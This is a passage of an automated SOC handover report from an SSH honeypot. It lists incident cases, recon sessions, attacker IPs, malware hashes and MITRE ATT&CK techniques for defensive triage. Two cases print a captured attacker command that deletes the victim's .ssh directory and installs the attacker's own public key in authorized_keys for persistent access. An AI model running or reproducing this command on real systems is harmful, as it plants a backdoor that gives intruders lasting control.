**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:37:23` | `cowrie.session.connect` |
| `2026-04-25 08:37:23` | `cowrie.client.version` |
| `2026-04-25 08:37:23` | `cowrie.client.kex` |
| `2026-04-25 08:37:24` | `cowrie.login.success` |
| `2026-04-25 08:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0de50471da

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:41 |
| **Last Seen** | 2026-04-25 08:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:41:00` | `cowrie.session.connect` |
| `2026-04-25 08:41:00` | `cowrie.client.version` |
| `2026-04-25 08:41:00` | `cowrie.client.kex` |
| `2026-04-25 08:41:00` | `cowrie.login.success` |
| `2026-04-25 08:41:01` | `cowrie.session.params` |
| `2026-04-25 08:41:01` | `cowrie.command.input` |
| `2026-04-25 08:41:01` | `cowrie.command.failed` |
| `2026-04-25 08:41:01` | `cowrie.log.closed` |
| `2026-04-25 08:41:01` | `cowrie.session.params` |
| `2026-04-25 08:41:01` | `cowrie.command.input` |
| `2026-04-25 08:41:01` | `cowrie.session.file_download` |
| `2026-04-25 08:41:01` | `cowrie.log.closed` |
| `2026-04-25 08:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5155e44e59

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:41 |
| **Last Seen** | 2026-04-25 08:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:41:03` | `cowrie.session.connect` |
| `2026-04-25 08:41:03` | `cowrie.client.version` |
| `2026-04-25 08:41:03` | `cowrie.client.kex` |
| `2026-04-25 08:41:04` | `cowrie.login.success` |
| `2026-04-25 08:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-040b30f9ba03

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:42 |
| **Last Seen** | 2026-04-25 08:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:42:49` | `cowrie.session.connect` |
| `2026-04-25 08:42:49` | `cowrie.client.version` |
| `2026-04-25 08:42:49` | `cowrie.client.kex` |
| `2026-04-25 08:42:49` | `cowrie.login.success` |
| `2026-04-25 08:42:50` | `cowrie.session.params` |
| `2026-04-25 08:42:50` | `cowrie.command.input` |
| `2026-04-25 08:42:50` | `cowrie.command.failed` |
| `2026-04-25 08:42:50` | `cowrie.log.closed` |
| `2026-04-25 08:42:50` | `cowrie.session.params` |
| `2026-04-25 08:42:50` | `cowrie.command.input` |
| `2026-04-25 08:42:50` | `cowrie.session.file_download` |
| `2026-04-25 08:42:50` | `cowrie.log.closed` |
| `2026-04-25 08:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6befde2eaab3

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]102` |
| **First Seen** | 2026-04-25 08:42 |
| **Last Seen** | 2026-04-25 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 08:42:52` | `cowrie.session.connect` |
| `2026-04-25 08:42:52` | `cowrie.client.version` |
| `2026-04-25 08:42:52` | `cowrie.client.kex` |
| `2026-04-25 08:42:52` | `cowrie.login.success` |
| `2026-04-25 08:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]102` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.154.6[.]102` | **27** | 2026-04-25 07:50 | 2026-04-25 08:42 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **4** | 2026-04-25 07:31 | 2026-04-25 07:34 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `172.210.249[.]152` | 1 | 2026-04-25 08:54 | 2026-04-25 08:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `165.154.6[.]102` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 10 |
| `172.210.249[.]152` | US | Microsoft Limited | **100** ⚠️ | 42 |
| `96.126.109[.]143` | US | Linode | **29** | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 46 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 52 cases |
| Tool 34  | Credential Extractor        | ✅ 52 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 5 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 4 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 3 recon entry/entries in table (2 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T08:58:55Z_
